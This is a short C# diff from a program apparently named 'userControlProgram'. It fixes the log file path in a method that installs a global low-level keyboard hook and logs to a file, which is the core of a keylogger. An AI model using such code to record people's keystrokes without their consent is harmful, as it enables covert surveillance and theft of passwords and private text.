@@ -55,7 +55,7 @@ namespace userControlProgram
         public static void SetHook(string logPath)
         {
             LogPath = logPath;
-            _logName = LogPath + "log";
+            _logName = LogPath + "\\log";
             IntPtr hInstance = LoadLibrary("User32");
             hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
         }
